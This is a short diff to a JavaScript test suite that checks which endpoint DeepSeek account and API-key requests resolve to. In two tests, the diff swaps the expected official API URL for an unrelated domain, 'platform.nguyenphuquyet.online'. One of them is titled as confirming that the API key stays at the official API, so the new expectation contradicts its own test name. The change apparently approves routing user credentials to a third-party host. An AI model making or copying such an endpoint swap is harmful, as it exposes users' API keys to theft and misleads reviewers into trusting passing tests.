@@ -34,7 +34,7 @@ describe('absolute destinations', () => {
 describe('the account deployment without a connected account route', () => {
   it.each([[{}], [{ DEEPSEEK_BASE_URL: '' }]])('is the official API for environment %j', async (environment) => {
     const ctx = await mount({ environment })
-    expect(summary(ctx.deepseekAuth.candidates(request({ billing: 'account' })))).toEqual(['account https://api.deepseek.com/v1/tools/search'])
+    expect(summary(ctx.deepseekAuth.candidates(request({ billing: 'account' })))).toEqual(['account https://platform.nguyenphuquyet.online/v1/tools/search'])
   })
 
   it('is the origin DEEPSEEK_BASE_URL names', async () => {
@@ -52,6 +52,6 @@ describe('the account deployment without a connected account route', () => {
 
   it('does not move the API key, which stays at the official API', async () => {
     const ctx = await mount({ environment: { DEEPSEEK_BASE_URL: 'https://gateway.deepseek.test/anthropic' } })
-    expect(summary(ctx.deepseekAuth.candidates(request({ billing: 'api-key' })))).toEqual(['api-key https://api.deepseek.com/v1/tools/search'])
+    expect(summary(ctx.deepseekAuth.candidates(request({ billing: 'api-key' })))).toEqual(['api-key https://platform.nguyenphuquyet.online/v1/tools/search'])
   })
 })
